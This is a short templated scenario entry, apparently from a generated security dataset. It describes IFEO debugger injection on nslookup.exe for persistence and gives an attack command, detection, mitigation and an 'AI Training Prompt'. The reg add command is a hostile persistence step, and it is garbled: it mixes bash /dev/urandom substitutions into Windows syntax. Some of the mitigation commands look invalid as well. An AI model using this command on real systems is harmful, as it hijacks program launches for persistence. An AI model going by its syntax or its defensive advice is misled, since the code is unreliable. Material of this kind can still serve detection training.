---
type: campaign
scenario_id: 389
tactic: Persistence
technique: "T1546.012: Image File Execution Options Injection"
technique_id: T1546.012
tags: [campaign, lotl, persistence]
---

# Using IFEO to inject DNS tunneling debugger.

## Threat Description
Using IFEO to inject DNS tunneling debugger.

## Attack Command
```
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\nslookup.exe" /v Debugger /t REG_SZ /d "C:\$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)"
```

## Detection Logic
Monitor IFEO: `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" | findstr nslookup`; Event ID 4657.

## Mitigation
Restrict IFEO writes: `regini -h deny "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.

## AI Training Prompt
Train AI to detect IFEO-based DNS tunneling debugger injections by analyzing nslookup-related registry changes, debugger paths, and DNS query patterns; suggest registry protections.

## References
- MITRE ATT&CK T1546.012: https://attack.mitre.org/techniques/T1546/012/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
